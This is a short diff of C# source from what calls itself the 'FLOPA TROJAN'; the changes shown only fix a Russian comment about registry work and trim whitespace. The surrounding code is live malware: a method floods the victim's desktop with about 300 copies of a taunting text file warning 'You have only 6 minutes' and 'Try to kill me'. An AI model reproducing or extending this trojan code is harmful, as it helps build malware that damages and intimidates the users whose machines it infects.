@@ -8,7 +8,7 @@ namespace Crock
 {
     class Addition
     {
-        // Работа сриетсром
+        // Работа с риетсром
         public static void RegFun()
         {
             const string quote = "\"";
@@ -35,13 +35,13 @@ namespace Crock
         public static void TrashDestop()
         {
             string desktop_files = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
-            File.WriteAllText(desktop_files + @"\POTATOES_POTATOES_POTATOES_POTATOES_POTATOES_POTATOES_POTATOES_POTATOES_POTATOES.txt", 
+            File.WriteAllText(desktop_files + @"\POTATOES_POTATOES_POTATOES_POTATOES_POTATOES_POTATOES_POTATOES_POTATOES_POTATOES.txt",
                 "WELCOME TO FLOPA TROJAN." + Environment.NewLine + "Try to kill me if its possible for you." + Environment.NewLine + "You have only 6 minutes." + Environment.NewLine + "" + Environment.NewLine + "GOOD LUCK.");
             try
             {
                 for (int s = 1; s < 300; s++)
                 {
-                    File.Copy(desktop_files + @"\POTATOES_POTATOES_POTATOES_POTATOES_POTATOES_POTATOES_POTATOES_POTATOES_POTATOES.txt", 
+                    File.Copy(desktop_files + @"\POTATOES_POTATOES_POTATOES_POTATOES_POTATOES_POTATOES_POTATOES_POTATOES_POTATOES.txt",
                         desktop_files + $"\\POTATOES_POTATOES_POTATOES_POTATOES_POTATOES_POTATOES_POTATOES_POTATOES_POTATOES({s}).txt");
                 }
             }
